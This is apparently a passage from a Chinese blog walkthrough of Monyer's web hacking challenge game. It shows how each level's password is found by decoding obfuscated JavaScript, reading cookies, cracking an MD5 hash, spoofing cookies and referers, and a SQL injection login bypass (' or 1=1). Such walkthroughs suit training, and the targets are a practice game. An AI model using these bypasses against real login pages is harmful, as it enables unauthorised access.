class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>));</div><div class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></div></pre></td></tr></table></figure>\n<p>新时代无须解释，直接上chrome consle<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">32</span>,<span class=\"number\">99</span>,<span class=\"number\">104</span>,<span class=\"number\">101</span>,<span class=\"number\">99</span>,<span class=\"number\">107</span>,<span class=\"number\">40</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">114</span>,<span class=\"number\">32</span>,<span class=\"number\">97</span>,<span class=\"number\">32</span>,<span class=\"number\">61</span>,<span class=\"number\">32</span>,<span class=\"number\">39</span>,<span class=\"number\">100</span>,<span class=\"number\">52</span>,<span class=\"number\">103</span>,<span class=\"number\">39</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">105</span>,<span class=\"number\">102</span>,<span class=\"number\">40</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">117</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">46</span>,<span class=\"number\">103</span>,<span class=\"number\">101</span>,<span class=\"number\">116</span>,<span class=\"number\">69</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">109</span>,<span class=\"number\">101</span>,<span class=\"number\">110</span>,<span class=\"number\">116</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">73</span>,<span class=\"number\">100</span>,<span class=\"number\">40</span>,<span class=\"number\">39</span>,<span class=\"number\">116</span>,<span class=\"number\">120</span>,<span class=\"number\">116</span>,<span class=\"number\">39</span>,<span class=\"number\">41</span>,<span class=\"number\">46</span>,<span class=\"number\">118</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">117</span>,<span class=\"number\">101</span>,<span class=\"number\">61</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">41</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">119</span>,<span class=\"number\">105</span>,<span class=\"number\">110</span>,<span class=\"number\">100</span>,<span class=\"number\">111</span>,<span class=\"number\">119</span>,<span class=\"number\">46</span>,<span class=\"number\">108</span>,<span class=\"number\">111</span>,<span class=\"number\">99</span>,<span class=\"number\">97</span>,<span class=\"number\">116</span>,<span class=\"number\">105</span>,<span class=\"number\">111</span>,<span class=\"number\">110</span>,<span class=\"number\">46</span>,<span class=\"number\">104</span>,<span class=\"number\">114</span>,<span class=\"number\">101</span>,<span class=\"number\">102</span>,<span class=\"number\">61</span>,<span class=\"number\">97</span>,<span class=\"number\">43</span>,<span class=\"number\">34</span>,<span class=\"number\">46</span>,<span class=\"number\">112</span>,<span class=\"number\">104</span>,<span class=\"number\">112</span>,<span class=\"number\">34</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">101</span>,<span class=\"number\">108</span>,<span class=\"number\">115</span>,<span class=\"number\">101</span>,<span class=\"number\">123</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">09</span>,<span class=\"number\">97</span>,<span class=\"number\">108</span>,<span class=\"number\">101</span>,<span class=\"number\">114</span>,<span class=\"number\">116</span>,<span class=\"number\">40</span>,<span class=\"number\">34</span>,<span class=\"number\">23494</span>,<span class=\"number\">30721</span>,<span class=\"number\">38169</span>,<span class=\"number\">35823</span>,<span class=\"number\">34</span>,<span class=\"number\">41</span>,<span class=\"number\">59</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">09</span>,<span class=\"number\">125</span>,<span class=\"number\">13</span>,<span class=\"number\">10</span>,<span class=\"number\">125</span>)</div></pre></td></tr></table></figure></p>\n<p>输出为<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>)</span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">var</span> a = <span class=\"string\">'d4g'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value==a)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href=a+<span class=\"string\">\".php\"</span>;</div><div class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>好了我们知道了，密码是d4g，下一关！</p>\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><p><a href=\"http://monyer.com/game/game1/d4g.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/d4g.php</a></p>\n<p>这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。<br>打开后立即按esc停止。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span> c.toString(<span class=\"number\">36</span>)&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\\\w+'</span>&#125;;c=<span class=\"number\">1</span>&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\\\b'</span>+e(c)+<span class=\"string\">'\\\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p&#125;(<span class=\"string\">'a=\"e\";d c()&#123;b(9.8(\\'7\\').6==a)&#123;5.4.3=a+\".2\"&#125;1&#123;0(\"密码错误\")&#125;&#125;'</span>,<span class=\"number\">15</span>,<span class=\"number\">15</span>,<span class=\"string\">'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</div><div class=\"line\">&lt;<span class=\"regexp\">/script&gt;</span></div></pre></td></tr></table></figure>\n<p>显然这是一个加密的js，我们需要解密，上解密工具：</p>\n<p><a href=\"http://tool.lu/js/\" target=\"_blank\" rel=\"external\">http://tool.lu/js/</a></p>\n<p>解密后：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = <span class=\"string\">\"3bhe\"</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check</span>(<span class=\"params\"></span>) </span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'txt'</span>).value == a) &#123;</div><div class=\"line\">\t\t<span class=\"built_in\">window</span>.location.href = a + <span class=\"string\">\".php\"</span></div><div class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">\t\talert(<span class=\"string\">\"密码错误\"</span>)</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>密码是 3bhe 下一关</p>\n<p>诶？怎么不对？仔细检查源代码发现下面还有一行<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\"</span>);</div></pre></td></tr></table></figure></p>\n<p>解密！<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">a = a.toUpperCase() + <span class=\"number\">1</span>;</div></pre></td></tr></table></figure></p>\n<p>.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go</p>\n<h1 id=\"第五关\"><a href=\"#第五关\" class=\"headerlink\" title=\"第五关\"></a>第五关</h1><p><a href=\"http://monyer.com/game/game1/3BHE1.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/3BHE1.php</a></p>\n<blockquote>\n<p>密码在哪儿？额，我藏在页面里了哦！</p>\n</blockquote>\n<p>这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？</p>\n<p>找到了，在cookie里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">monyer:the password for the next level is asdf</div></pre></td></tr></table></figure>\n<p>下一关！</p>\n<h1 id=\"第六关\"><a href=\"#第六关\" class=\"headerlink\" title=\"第六关\"></a>第六关</h1><p><a href=\"http://monyer.com/game/game1/asdf.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/asdf.php</a></p>\n<p>是个线索题目</p>\n<p>Get the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …</p>\n<p>真蛋疼<br>把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。</p>\n<p>这个答案是；seventeen</p>\n<h1 id=\"第七关\"><a href=\"#第七关\" class=\"headerlink\" title=\"第七关\"></a>第七关</h1><p><a href=\"http://monyer.com/game/game1/seventeen7.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/seventeen7.php</a></p>\n<p>社工题</p>\n<p>先解密md5吧</p>\n<p>5e023995fb3f5e840ee684784f8f0799</p>\n<p><a href=\"http://www.somd5.com/\" target=\"_blank\" rel=\"external\">http://www.somd5.com/</a></p>\n<p>解密出  eighteen8</p>\n<p>下一关</p>\n<h1 id=\"第八关\"><a href=\"#第八关\" class=\"headerlink\" title=\"第八关\"></a>第八关</h1><p><a href=\"http://monyer.com/game/game1/eighteen8.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/eighteen8.php</a></p>\n<p>直接看到 一个404 不要着急 审查工具</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;p style=&quot;display:none&quot;&gt;</div><div class=\"line\">第8关</div><div class=\"line\">朋友您好，第8关欢迎您！</div><div class=\"line\">我对您的聪明才智感到惊讶！</div><div class=\"line\">相信我，现在世界上85%以上的人都在你之下，</div><div class=\"line\">所以你可以大步向前，义无反顾地进行你的事业了。</div><div class=\"line\">因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。</div><div class=\"line\">那么继续我们的约定，我将告诉你第9关的入口：</div><div class=\"line\">10000以内所有质数和.php</div><div class=\"line\">&lt;/p&gt;</div></pre></td></tr></table></figure>\n<p>10000以内所有质数和，so easy！写个javascript 算一下。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">var sum = 0;</div><div class=\"line\">for (var i = 2; i &lt; 10000; i++) &#123;</div><div class=\"line\">\tvar flag = true;</div><div class=\"line\">\tfor (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;</div><div class=\"line\">\t\tif (i % j == 0) flag = false ;</div><div class=\"line\">\t&#125;</div><div class=\"line\">    if(flag) &#123;sum = sum + i;&#125;</div><div class=\"line\">&#125;</div><div class=\"line\">console.log(sum);</div><div class=\"line\"></div><div class=\"line\">5736396</div></pre></td></tr></table></figure>\n<p>下一关</p>\n<h1 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h1><p><a href=\"http://monyer.com/game/game1/5736396.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/5736396.php</a></p>\n<p>在命令行里输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://monyer.com/game/game1/img/4681851790659554.jpg</div><div class=\"line\">cat 4681851790659554.jpg</div></pre></td></tr></table></figure></p>\n<p>密码藏在图片里<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����</div><div class=\"line\">�Ǿ���ʽ�ʲô���ţ�</div><div class=\"line\">�ԣ�������������������......��</div><div class=\"line\">��ϲ�㣡</div><div class=\"line\">��ʮ������Ϊ��MonyerLikeYou_the10level</div><div class=\"line\">�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�</div><div class=\"line\">�����Լ���û��ģ�%</div></pre></td></tr></table></figure></p>\n<p>MonyerLikeYou_the10level</p>\n<h1 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h1><p><a href=\"http://monyer.com/game/game1/MonyerLikeYou_the10level.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/MonyerLikeYou_the10level.php</a></p>\n<blockquote>\n<p>当前用户身份为simpleuser 不是admin，无法显示下一关密码</p>\n</blockquote>\n<p>很显然这是一道session/cookie欺骗题</p>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=admin&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新</p>\n<blockquote>\n<p>好聪明哦！下一关密码为：doyouknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h1><p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_false\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/doyouknow.php?action=show_login_false</a></p>\n<blockquote>\n<p>你的session不是passer，不能查看下一关密码</p>\n</blockquote>\n<p>在console里直接输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">document.cookie=&quot;username=passer&quot;</div></pre></td></tr></table></figure></p>\n<p>刷新，好像不对哦，monyer骗我，哼！</p>\n<p>再看标题 action=show_login_false </p>\n<p><a href=\"http://monyer.com/game/game1/doyouknow.php?action=show_login_true\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/doyouknow.php?action=show_login_true</a></p>\n<blockquote>\n<p>您的session为passer，所以您可以查看下一关密码：smartboy</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h1><p><a href=\"http://monyer.com/game/game1/smartboy.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/smartboy.php</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">JTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3</div></pre></td></tr></table></figure>\n<p>直觉告诉我，这显然是Base64 解密<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77</div></pre></td></tr></table></figure></p>\n<p>直觉告诉我，这显然是 UrlEncode 解密</p>\n<p>JTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw</p>\n<p>直觉再次告诉我，这显然是 Base64 解密</p>\n<p>%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70</p>\n<p>直觉再次告诉我，这显然是  UrlEncode 解密</p>\n<p>sobeautiful.php</p>\n<p>不错 密码就是sobeautiful</p>\n<h1 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h1><p><a href=\"http://monyer.com/game/game1/sobeautiful.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/sobeautiful.php</a></p>\n<blockquote>\n<p>本页禁止盗链！</p>\n</blockquote>\n<p>wtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>= <span class=\"string\">\"http://monyer.com/game/game1/sobeautiful.php\"</span>&gt;</span> 简便伪造referer<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div></pre></td></tr></table></figure>\n<blockquote>\n<p>欢迎您来到第13关</p>\n<p>请输入密码进入第14关：</p>\n<p>没有输入密码 或 密码错误 或 系统错误！</p>\n</blockquote>\n<p>看源代码有post提交</p>\n<p>这是一道SQL 注入题</p>\n<p>试试我大万能密码！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&apos; or 1=1</div></pre></td></tr></table></figure></p>\n<p>万能密码熟记于心</p>\n<blockquote>\n<p>下一关密码：whatyouneverknow</p>\n</blockquote>\n<p>下一关！</p>\n<h1 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h1><p><a href=\"http://monyer.com/game/game1/whatyouneverknow.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/whatyouneverknow.php</a></p>\n<p>感谢@Echowxsy提供第14关解密过程</p>\n<p><img src=\"/content/images/monyerhack/01.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/02.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/03.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/1.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/2.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/3.jpg\" alt=\"\"></p>\n<p><img src=\"/content/images/monyerhack/5.jpg\" alt=\"\"></p>\n<h1 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h1><p><img src=\"/content/images/monyerhack/4.png\" alt=\"\"></p>\n","excerpt":"<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>","more":"<h1 id=\"第零关\"><a href=\"#第零关\" class=\"headerlink\" title=\"第零关\"></a>第零关</h1><p><a href=\"http://monyer.com/game/game1/\">http://monyer.com/game/game1/</a></p>\n<blockquote>\n<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>\n</blockquote>\n<p>可是我们看不到链接地址，直接打开审查工具。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>连接在左边→<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"first.php\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>←连接在右边<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好的输入地址，我么进入第一关</p>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p><a href=\"http://monyer.com/game/game1/first.php\">http://monyer.com/game/game1/first.php</a></p>\n<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"undefined\"></div><div class=\"line\">    function check()&#123;</div><div class=\"line\">        if(document.getElementById('txt').value==\"  \")&#123;</div><div class=\"line\">            window.location.href=\"hello.php\";</div><div class=\"line\">        &#125;else&#123;</div><div class=\"line\">            alert(\"密码错误\");</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p><a href=\"http://monyer.com/game/game1/hello.php\">http://monyer.com/game/game1/hello.php</a></p>\n<p>审查工具看源代码，head中</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"undefined\"></div><div class=\"line\">    document.oncontextmenu=function()&#123;return false&#125;;</div><div class=\"line\"></div><div class=\"line\">    var 